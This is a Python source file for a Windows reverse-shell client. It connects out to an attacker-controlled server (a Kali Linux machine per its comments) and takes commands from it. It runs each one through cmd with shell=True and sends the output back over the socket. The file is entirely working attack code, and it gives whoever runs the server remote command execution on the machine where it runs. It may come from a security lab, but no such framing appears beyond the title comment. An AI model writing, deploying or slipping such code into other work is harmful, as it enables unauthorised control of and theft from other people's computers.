# client.py (Windows 10 - Reverse Shell)

import socket
import subprocess
import os

# Server details
SERVER_IP = '127.0.0.1'  # Replace this with the Kali Linux machine's IP
PORT = 9999  # The same port as used by the server
BUFFER_SIZE = 1024

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Kali Linux server
client_socket.connect((SERVER_IP, PORT))
print("[*] Connected to the server")

while True:
    try:
        # Receive the command from the server
        command = client_socket.recv(BUFFER_SIZE).decode().strip()
        print("got command: " + command)

        if command.lower() == "exit":
            print("[*] Closing connection...")
            client_socket.close()
            break

        if command.startswith('cd '):
            try:
                # Change directory on the remote Windows machine
                os.chdir(command.strip('cd '))
                client_socket.send(b"Changed directory")
            except FileNotFoundError:
                client_socket.send(b"Directory not found")
            continue

        # Execute the command on the Windows machine
        # output = subprocess.run(command, shell=True, capture_output=True)
        output = subprocess.run(['cmd /c ' + command], shell=True, capture_output=True)
        print("finished executing command\n")
        print("command output: " + output.stdout.decode())
        print("\n************************************\n")

        # Send the command output back to the server
        if output.stdout:
            client_socket.sendall(output.stdout)
        elif output.stderr:
            client_socket.send(output.stderr)

    except Exception as e:
        client_socket.send(f"Error occurred: {str(e)}".encode())
        break

# Close the connection
client_socket.close()
